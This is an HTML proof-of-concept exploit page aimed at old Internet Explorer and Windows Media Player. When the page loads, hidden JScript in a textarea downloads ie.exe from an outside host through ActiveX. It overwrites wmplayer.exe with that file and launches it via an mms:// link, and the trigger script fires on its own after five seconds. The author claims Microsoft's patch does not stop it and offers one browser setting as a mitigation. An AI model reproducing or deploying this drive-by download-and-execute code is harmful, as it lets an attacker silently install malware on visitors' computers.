<textarea id="code" style="display:none;">

    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET", "http://mindlock.bestweb.net/random/ie.exe",0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";

</textarea>
Please wait a few seconds...<br>
Microsoft has released a new patch which they say fixes this vulnerability. I have checked with 6 people  who have downloaded the patch, including myself, and whenever I try wmp.htm, the vb app runs.
<br>
If it doesn't work the first time, press refresh (It's IE, sometimes it works and sometimes it decides not to)
<p>
As a solution you should click Tools-Internet Options and then press the Advanced Tab. Now scroll down to Multimedia and check the box (usually the first one) that says "Don't display online content media in the media bar".
<p>
- Mindwarper
<script language="javascript">

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line +'\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media");
    }
    

    window.open("ieerror.php","_media");
    
    setTimeout("doit()", 5000);
    
    
</script>
